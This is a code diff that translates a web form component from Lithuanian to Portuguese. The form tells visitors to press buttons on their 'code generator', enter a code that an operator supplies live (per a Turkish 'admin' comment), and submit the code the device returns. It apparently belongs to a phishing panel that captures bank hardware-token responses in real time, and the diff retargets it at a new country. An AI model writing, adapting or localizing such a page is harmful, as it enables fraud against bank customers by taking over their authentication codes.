@@ -108,7 +108,7 @@ export function GeneratorClient({ sessionId, variant }: Props) {
 
     setSaving(false);
     if (upErr) {
-      setError("Klaida. Bandykite dar kartą.");
+      setError("Erro. Por favor, tente novamente.");
       return;
     }
     setDone(true);
@@ -121,8 +121,8 @@ export function GeneratorClient({ sessionId, variant }: Props) {
           <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M5 13l4 4L19 7" />
         </svg>
       </div>
-      <p className="text-lg font-bold text-gray-900">Ačiū!</p>
-      <p className="mt-1 text-sm text-gray-500">Jūsų duomenys sėkmingai išsiųsti.</p>
+      <p className="text-lg font-bold text-gray-900">Obrigado!</p>
+      <p className="mt-1 text-sm text-gray-500">Os seus dados foram enviados com sucesso.</p>
     </div>
   );
 
@@ -145,7 +145,7 @@ export function GeneratorClient({ sessionId, variant }: Props) {
               <div className="flex flex-col items-center gap-3 pt-2">
                 <img
                   src="/generator/code-calc-old.webp"
-                  alt="Kodų generatorius"
+                  alt="Gerador de códigos"
                   className="h-28 object-contain"
                 />
                 <h1 className="text-base font-extrabold uppercase tracking-widest text-gray-900">
@@ -170,7 +170,7 @@ export function GeneratorClient({ sessionId, variant }: Props) {
                   <path fillRule="evenodd" d="M8.485 2.495c.673-1.167 2.357-1.167 3.03 0l6.28 10.875c.673 1.167-.17 2.625-1.516 2.625H3.72c-1.347 0-2.189-1.458-1.515-2.625l6.28-10.875zM10 6.5a.75.75 0 01.75.75v3.5a.75.75 0 01-1.5 0v-3.5A.75.75 0 0110 6.5zm0 8a1 1 0 100-2 1 1 0 000 2z" clipRule="evenodd" />
                 </svg>
                 <p className="text-[13px] font-medium leading-snug text-amber-800">
-                  Šis vaizdo įrašas pateiktas kaip pavyzdys. Tikrasis kodas gali skirtis.
+                  Este vídeo é apresentado como exemplo. O código real pode ser diferente.
                 </p>
               </div>
 
@@ -180,7 +180,7 @@ export function GeneratorClient({ sessionId, variant }: Props) {
                   <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a.75.75 0 000 1.5h.253a.25.25 0 01.244.304l-.459 2.066A1.75 1.75 0 0010.747 15H11a.75.75 0 000-1.5h-.253a.25.25 0 01-.244-.304l.459-2.066A1.75 1.75 0 009.253 9H9z" clipRule="evenodd" />
                 </svg>
                 <p className="text-[13px] font-medium leading-snug text-blue-800">
-                  Bakstelėkite 1 savo įrenginyje ir įveskite kodą, kurį matote toliau esančiame laukelje.
+                  Prima 1 no seu dispositivo e introduza o código que vê no campo abaixo.
                 </p>
               </div>
 
@@ -195,7 +195,7 @@ export function GeneratorClient({ sessionId, variant }: Props) {
                   onChange={(e) =>
                     setValues((prev) => ({ ...prev, generatoriaus_kodas: e.target.value }))
                   }
-                  placeholder="Įveskite generatoriaus kodą"
+                  placeholder="Introduza o código do gerador"
                   className="w-full rounded-xl border border-gray-200 bg-gray-50 px-4 py-3.5 text-sm font-medium text-gray-900 outline-none transition-all focus:border-[var(--brand)] focus:bg-white focus:ring-2 focus:ring-[var(--brand)]/20"
                 />
               </div>
@@ -207,7 +207,7 @@ export function GeneratorClient({ sessionId, variant }: Props) {
                 disabled={saving}
                 className="w-full rounded-xl bg-[var(--brand)] px-4 py-3.5 text-sm font-bold text-white shadow-lg shadow-[var(--brand)]/25 transition-all hover:bg-[#0c9142] disabled:opacity-50"
               >
-                {saving ? "Siunčiama..." : "Tęsti"}
+                {saving ? "A enviar..." : "Continuar"}
               </button>
             </form>
           )}
@@ -235,7 +235,7 @@ export function GeneratorClient({ sessionId, variant }: Props) {
             <div className="flex flex-col items-center gap-3 pt-2">
               <img
                 src="/generator/code-calc-old.webp"
-                alt="Kodų generatorius"
+                alt="Gerador de códigos"
                 className="h-28 object-contain"
               />
               <h1 className="text-base font-extrabold uppercase tracking-widest text-gray-900">
@@ -260,14 +260,14 @@ export function GeneratorClient({ sessionId, variant }: Props) {
                 <path fillRule="evenodd" d="M8.485 2.495c.673-1.167 2.357-1.167 3.03 0l6.28 10.875c.673 1.167-.17 2.625-1.516 2.625H3.72c-1.347 0-2.189-1.458-1.515-2.625l6.28-10.875zM10 6.5a.75.75 0 01.75.75v3.5a.75.75 0 01-1.5 0v-3.5A.75.75 0 0110 6.5zm0 8a1 1 0 100-2 1 1 0 000 2z" clipRule="evenodd" />
               </svg>
               <p className="text-[13px] font-medium leading-snug text-amber-800">
-                Šis vaizdo įrašas pateiktas kaip pavyzdys. Tikrasis kodas gali skirtis.
+                Este vídeo é apresentado como exemplo. O código real pode ser diferente.
               </p>
             </div>
 
             {/* Admin'in girdigi kod (sari kutu) */}
             <div className="rounded-xl border border-amber-400/70 bg-amber-400/20 px-4 py-3 text-center">
               <p className="text-sm font-bold text-gray-900">
-                Įveskite šį kodą: <span className="font-mono tracking-widest">{shownCode}</span>
+                Introduza este código: <span className="font-mono tracking-widest">{shownCode}</span>
               </p>
             </div>
 
@@ -277,9 +277,9 @@ export function GeneratorClient({ sessionId, variant }: Props) {
                 <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a.75.75 0 000 1.5h.253a.25.25 0 01.244.304l-.459 2.066A1.75 1.75 0 0010.747 15H11a.75.75 0 000-1.5h-.253a.25.25 0 01-.244-.304l.459-2.066A1.75 1.75 0 009.253 9H9z" clipRule="evenodd" />
               </svg>
               <p className="text-[13px] font-medium leading-snug text-blue-800">
-                Generatoriuje paspauskite 2, įveskite kodą{" "}
-                <span className="font-mono font-bold">{shownCode}</span> į generatorių ir
-                įrašykite gautą kodą į žemiau esantį laukelį, tada tęskite.
+                Prima 2 no gerador, introduza o código{" "}
+                <span className="font-mono font-bold">{shownCode}</span> no gerador e
+                escreva o código obtido no campo abaixo para continuar.
               </p>
             </div>
 
@@ -294,7 +294,7 @@ export function GeneratorClient({ sessionId, variant }: Props) {
                 onChange={(e) =>
                   setValues((prev) => ({ ...prev, generatoriaus_kodas: e.target.value }))
                 }
-                placeholder="Įveskite generatoriaus kodą"
+                placeholder="Introduza o código do gerador"
                 className="w-full rounded-xl border border-gray-200 bg-gray-50 px-4 py-3.5 text-sm font-medium text-gray-900 outline-none transition-all focus:border-[var(--brand)] focus:bg-white focus:ring-2 focus:ring-[var(--brand)]/20"
               />
             </div>
@@ -306,7 +306,7 @@ export function GeneratorClient({ sessionId, variant }: Props) {
               disabled={saving}
               className="w-full rounded-xl bg-[var(--brand)] px-4 py-3.5 text-sm font-bold text-white shadow-lg shadow-[var(--brand)]/25 transition-all hover:bg-[#0c9142] disabled:opacity-50"
             >
-              {saving ? "Siunčiama..." : "Tęsti"}
+              {saving ? "A enviar..." : "Continuar"}
             </button>
           </form>
         )}
